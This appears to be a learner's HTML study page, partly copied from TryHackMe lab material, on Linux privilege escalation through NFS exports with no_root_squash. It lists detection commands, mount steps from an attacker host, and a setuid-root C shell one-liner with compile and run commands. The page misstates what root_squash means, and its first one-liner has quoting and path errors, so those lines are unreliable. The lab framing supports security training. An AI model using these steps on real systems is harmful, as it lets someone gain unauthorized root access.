<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>NFS</title>
</head><body>Exploiting NFS<br/>
<br/>
root squash is essentailly saying the action will be performed as root.<br/>
no root squash will not be performed as root<br/>
<br/>
<br/>
Identfy with <br/>
<br/>
<b>cat /etc/exports</b><br/>
<br/>
looking for folder that define 'no_root_squash'<br/>
<br/>
This means it can be mounted<br/>
<br/>
<img height="297" src="image.png" width="750"/><br/>
<br/>
<br/>
can mount from attack... remotely<br/>
<br/>
review by<br/>
<br/>
<b>showmount -e &lt;victim ip&gt;</b><br/>
<br/>
Will list mountable folders<br/>
<br/>
on attacker, make a new tmp dir to mount to<br/>
<br/>
<b>mkdir /tmp/mountme</b><br/>
<br/>
<br/>
mount with<br/>
<br/>
<b>syntax &gt; mount -o rw,vers=2 &lt;victim ip&gt;:/&lt;dir name&gt; /tmp/mountme</b><br/>
<br/>
<br/>
<br/>
From here folder is mounted.. create a malicious payload. put in shared folder... and exploit from victim machine<br/>
<br/>
use 1 liner<br/>
<br/>
<b>echo 'int main() { setgid(0); setuid(0); system(&quot;/bin/bash); return 0; } &gt; tmp/mountme/exploit.c</b><br/>
<br/>
check it with cat /tmp/mountme/exploit.c<br/>
<br/>
complile it<br/>
<br/>
<b>gcc /tmp/mountme/exploit.c -o /tmp/mountme/exploit</b><br/>
<br/>
<b>chmod +s /tmp/mountme/exploit</b><br/>
<br/>
<br/>
now its set move back to victim.<br/>
<br/>
cd to tmp (the share folder)<br/>
<br/>
run the exploit<br/>
<br/>
<b>./exploit</b><br/>
<br/>
<br/>
<br/>
notes from THM<br/>
<br/>
Detection<br/>
<br/>
Linux VM<br/>
<br/>
1. In command line type: cat /etc/exports<br/>
2. From the output, notice that “no_root_squash” option is defined for the “/tmp” export.<br/>
<br/>
Exploitation<br/>
<br/>
Attacker VM<br/>
<br/>
1. Open command prompt and type: showmount -e MACHINE_IP<br/>
2. In command prompt type: mkdir /tmp/1<br/>
3. In command prompt type: mount -o rw,vers=2 MACHINE_IP:/tmp /tmp/1<br/>
In command prompt type:<br/>
echo 'int main() { setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0; }' &gt; /tmp/1/x.c<br/>
4. In command prompt type: gcc /tmp/1/x.c -o /tmp/1/x<br/>
5. In command prompt type: chmod +s /tmp/1/x<br/>
<br/>
Linux VM<br/>
<br/>
1. In command prompt type: /tmp/x<br/>
2. In command prompt type: id</body></html>